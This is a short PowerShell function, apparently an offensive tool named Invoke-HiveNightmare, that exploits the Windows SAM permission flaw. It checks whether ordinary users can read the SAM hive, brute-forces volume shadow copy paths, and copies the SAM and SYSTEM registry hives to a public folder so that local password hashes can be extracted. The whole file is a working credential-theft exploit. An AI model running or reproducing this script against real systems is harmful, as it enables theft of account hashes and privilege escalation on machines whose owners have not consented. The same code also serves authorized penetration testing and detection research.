function Invoke-HiveNightmare
{
	if(((Get-Acl -LiteralPath C:\Windows\System32\config\sam).Access | where{($_.IdentityReference -eq "BUILTIN\Users") -and ($_.FileSystemRights -like "*Read*")}).Count -gt 0)
	{
		Write-Output "[*] VULNERABLE - BUILTIN\Users have Read access on C:\Windows\System32\config\sam"
	}
	else
	{
		Write-Output "[!] BUILTIN\Users do not have Read access on C:\Windows\System32\config\sam but may on volume shadow copies"
	}
	Write-Output "`n[*] Bruteforcing volume shadow copies where users have Read access and copying all SAM and SYSTEM hives to C:\Users\Public\Documents...`n"
	for ($i = 1; $i -lt 99; $i++)
	{
		$path = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\sam"
		if(((Get-ItemProperty -LiteralPath $path).Count -gt 0) -and ((Get-Acl -LiteralPath $path).Access | where{($_.IdentityReference -eq "BUILTIN\Users") -and ($_.FileSystemRights -like "*Read*")}).Count -gt 0)
		{
			Write-Output $path
			[System.IO.File]::WriteAllBytes("C:\Users\Public\Documents\sammy$i",[System.IO.File]::ReadAllBytes("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\sam"))
			[System.IO.File]::WriteAllBytes("C:\Users\Public\Documents\sys$i",[System.IO.File]::ReadAllBytes("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\system"))
		}
	}
}
